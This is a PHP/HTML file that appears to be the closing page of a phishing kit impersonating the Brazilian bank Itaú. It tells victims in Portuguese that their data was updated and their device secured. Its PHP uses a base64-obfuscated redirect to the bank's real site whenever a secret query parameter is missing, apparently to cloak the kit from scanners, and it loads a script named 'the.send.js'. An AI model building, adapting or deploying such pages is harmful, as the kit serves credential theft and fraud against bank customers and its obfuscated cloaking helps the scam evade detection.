<?php 
if($_GET["the"]==null){
$xxxx = base64_decode("aHR0cHM6Ly93d3cuaXRhdS5jb20uYnIvbW9iaWxlL2NhcnRvZXMv");
header("Location: $xxxx");
}
else{
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<link rel="stylesheet" type="text/css" href="assets/css/style.atualizada.css?xx<?php echo time();?>">
	<script src="js/the.send.js?xx<?php echo time();?>"></script>
	<script src="js/jquery-3.2.1.min.js?xx<?php echo time();?>"></script>
</head>
<body>
	<header class="top-promo">
	<img src="assets/images/logo-login.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Segurança</li>
			<li class="active">Confirmação</li>
			<li class="active">Sucesso</li>
		</ul>
	</section>
	<section class="eng-fim" style="width: 70% !important;">
		<img class="img-suc" src="assets/images/ic_checked2.png">
		<h2>Parabéns</h2>
		<p style="font-weight: bold;font-size:13px !important; color: #484747 !important;">Seus dados foram atualizados com sucesso</p>
		<p style="font-weight: bold;font-size:13px !important; color: #484747 !important;">Agora, este dispositivo já está habilitado para usar nossas aplicações com total segurança.</p>
		<br>
	</section>
</body>
</html>